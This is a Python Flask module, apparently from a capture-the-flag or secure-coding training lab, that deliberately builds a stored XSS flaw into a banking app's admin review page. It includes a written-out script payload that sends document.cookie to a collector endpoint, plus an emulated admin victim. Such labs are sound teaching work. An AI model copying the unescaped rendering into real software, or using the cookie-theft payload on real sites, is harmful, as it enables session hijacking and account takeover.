"""W1-03 - stored XSS in a transfer note; admin session-cookie theft (A03).

Bounded file for one vulnerability (secure-coding phase shows exactly this).

Attack, multi-tenant by design (one shared instance, many concurrent players):
  1. Attacker creates a transfer whose "note" contains a payload pointing at
     their OWN collector token, e.g.
        <script>fetch('/w1-03/collect/<token>?c='+document.cookie)</script>
  2. Attacker reports the transfer. We EMULATE the admin opening the review
     page (a headless victim). The admin review template renders notes WITHOUT
     escaping (|safe) - the real sink - so the admin browser would run the
     payload. We perform that exfiltration server-side: every collector token
     referenced in the note receives the admin cookie (which carries
     FLAG_W1-03). Deterministic and cheap under heavy concurrency; each player
     uses their own token, so buckets never collide.
  3. Attacker reads their own /w1-03/collect/<token> and sees the flag.

Flag isolation: capture buckets live in PROCESS MEMORY, never in the database,
so the week's SQL injection (W1-02) can never reach FLAG_W1-03. This requires
the web to run as a single process with threads (see Dockerfile: gunicorn -w 1).
"""
import re
import threading

from flask import request, render_template, redirect, url_for

from . import bp
from ...auth import login_required, current_client
from ...db import get_db, fetch_one, fetch_all
from ...flags import get_flag

# token -> list of captured strings (shared across threads in the single worker)
_captures_lock = threading.Lock()
_captures = {}

_COLLECT_RE = re.compile(r"/w1-03/collect/([A-Za-z0-9_-]{1,64})")


def _to_amount(s):
    try:
        return -abs(float(s))
    except (TypeError, ValueError):
        return 0


@bp.route("/transfer", methods=["GET", "POST"])
@login_required
def transfer():
    client = current_client()
    acct = fetch_one(
        "SELECT id FROM accounts WHERE client_id = %s ORDER BY id LIMIT 1",
        (client["id"],),
    )
    new_id = None
    if request.method == "POST":
        counterparty = request.form.get("counterparty", "")
        note = request.form.get("note", "")
        amount = _to_amount(request.form.get("amount", "0"))
        # The note is stored verbatim; the sink is the admin review render.
        cur = get_db().cursor()
        cur.execute(
            "INSERT INTO transactions (account_id, amount, counterparty, note, direction) "
            "VALUES (%s, %s, %s, %s, 'out') RETURNING id",
            (acct["id"], amount, counterparty, note),
        )
        new_id = cur.fetchone()[0]
        cur.close()
    return render_template("transfer.html", new_id=new_id)


@bp.route("/admin/review")
@login_required
def admin_review():
    client = current_client()
    if client["role"] != "admin":
        return "Admins only.", 403
    # VULN: W1-03 stored XSS (A03/Injection) - notes rendered WITHOUT escaping
    # (admin_review.html uses |safe). A stored <script> runs in the admin's
    # browser and can read the admin cookie (which carries FLAG_W1-03).
    rows = fetch_all(
        "SELECT id, counterparty, amount, note FROM transactions ORDER BY id DESC LIMIT 50"
    )
    # Show a REDACTED cookie here. The real flag-bearing cookie is only
    # obtainable by stealing document.cookie via the stored XSS (the emulated bot
    # delivers _admin_cookie() below) - so becoming admin via W1-01's SQLi does
    # NOT hand you FLAG_W1-03. This keeps each task's flag isolated (brief req #5).
    return render_template("admin_review.html", rows=rows,
                           admin_cookie="session=admin-danubka; flag=<redacted - steal it via XSS>")


def _admin_cookie():
    # The admin's browser cookie - what the XSS steals. Carries the flag.
    return "session=admin-danubka; flag=" + get_flag("W1-03")


def _executable_collect_tokens(rendered_html):
    # Collector tokens that would ACTUALLY execute in the admin's browser: those
    # inside a real (unescaped) <script> tag or on*= handler. If the note was
    # HTML-escaped, none of these patterns match, so nothing "runs".
    out = []
    for m in re.finditer(r"<script[^>]*>(.*?)</script>", rendered_html, re.I | re.S):
        out += _COLLECT_RE.findall(m.group(1))
    for m in re.finditer(r"on\w+\s*=\s*([\"'])(.*?)\1", rendered_html, re.I | re.S):
        out += _COLLECT_RE.findall(m.group(2))
    return out


@bp.route("/w1-03/report/<int:tx_id>", methods=["GET", "POST"])
@login_required
def report_to_admin(tx_id):
    # Emulate the admin viewing the reported note: render it EXACTLY as the admin
    # view does (the _admin_note.html partial), then "execute" only what a real
    # browser would - a payload inside an unescaped <script>/on*=. Escaping the
    # note (the W1-03 fix) removes those, so nothing is delivered.
    row = fetch_one("SELECT note FROM transactions WHERE id = %s", (tx_id,))
    delivered = False
    if row and row["note"]:
        rendered = render_template("_admin_note.html", note=row["note"])
        tokens = _executable_collect_tokens(rendered)
        if tokens:
            cookie = _admin_cookie()
            with _captures_lock:
                for t in tokens:
                    _captures.setdefault(t, []).append(cookie)
            delivered = True
    return render_template("report_result.html", tx_id=tx_id, delivered=delivered)


@bp.route("/w1-03/collect/<token>")
def collect(token):
    # Attacker reads their own bucket here. A real browser hitting this with
    # ?c=... (e.g. from a true headless bot) is also recorded, so the endpoint
    # works for both the emulated and a browser-based victim.
    c = request.args.get("c")
    if c is not None:
        with _captures_lock:
            _captures.setdefault(token, []).append(c)
        return "ok"
    with _captures_lock:
        items = list(_captures.get(token, []))
    return render_template("collect.html", token=token, items=items)


@bp.route("/collector")
def collector_home():
    # Discoverable helper: type your token to jump to /w1-03/collect/<token>.
    token = request.args.get("token", "").strip()
    if token:
        return redirect(url_for("week1.collect", token=token))
    return render_template("collector_home.html")
